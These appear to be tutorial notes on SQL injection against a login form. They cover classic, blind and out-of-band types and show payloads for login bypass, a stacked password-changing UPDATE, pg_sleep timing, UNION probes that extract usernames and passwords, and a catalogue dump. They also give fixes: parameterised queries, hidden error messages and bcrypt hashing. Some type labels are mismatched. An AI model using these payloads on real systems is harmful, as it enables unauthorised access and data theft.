Types of SQL Injection: Discuss different types such as Classic SQL Injection, Blind SQL Injection, and Out-of-Band SQL Injection.

CASE 1:
1. Classic SQL Injection (In-Band SQL Injection)
   Description: Classic SQL Injection, also known as In-Band SQL Injection, is the most common and straightforward type of SQL injection. It occurs when an attacker can directly manipulate the SQL query and see the results in the application’s response.
   Example:
   username : user1' --
   password: anything

SELECT * FROM users WHERE username = 'user1' --' AND password = 'anything'

The -- comment sequence causes the rest of the query to be ignored, effectively bypassing the password check.


SOLUTION 1:
const result = await client.query(
'SELECT \* FROM users WHERE username = $1 AND password = $2',
[username, password]
);

CASE 2:
Example:
username : user1'; UPDATE users SET password='newpassword' WHERE username='user1' --
password: anything

CASE 3: 
2. Blind SQL Injection
Description: Blind SQL Injection occurs when the application does not return the results of the SQL query or any error messages, making it harder to exploit. Attackers infer information based on the application’s behavior.
Example:
username : ' OR '1'='1' --
password: anything

CASE 4: 
3. Out-of-Band SQL Injection
Description: Out-of-Band SQL Injection occurs when the attacker cannot use the same channel to send and receive data. Instead, they use different channels, such as DNS or HTTP requests, to exfiltrate data.
Example:
username : user1'; SELECT pg_sleep(5); --
password: anything

CASE 5:
not always a good idea to show the error message to the user. It can be used by attackers to get information about the database.
Example:
username : user1' OR 1=1; --

comment out this in the code
´´´	
if (err instanceof Error) {
return NextResponse.json(err.message, { status: 500 });
}
´´´

OR : 
user1' UNION SELECT NULL--
user1' UNION SELECT NULL,NULL--
user1' UNION SELECT NULL,NULL,NULL--
user1' UNION SELECT username, password FROM users --
This message indicates that there is a syntax error near the extra single quote, providing information about the database and the query structure.

´´´	
if (err instanceof Error) {
return NextResponse.json(err.message, { status: 500 });
}
´´´


CASE 6:
getting all the data from the database
Example:
username : ' OR 1=1; SELECT * FROM pg_catalog.pg_tables; --
password: anything

' UNION SELECT STRING_AGG(username, ', ') AS username
FROM users; --


SOLUTION 2:
Explanation
Hashing Passwords: The bcrypt.hash function takes the plain text password and a salt rounds value (10 in this case) to generate a hashed password.
Storing Hashed Passwords: The hashed password is stored in the database instead of the plain text password.
Verifying Passwords: The bcrypt.compare function compares the plain text password provided by the user with the hashed password stored in the database.
Benefits
Security: Hashing passwords ensures that even if the database is compromised, the actual passwords are not exposed.
Salting: bcrypt automatically adds a unique salt to each password, making it more secure against rainbow table attacks.
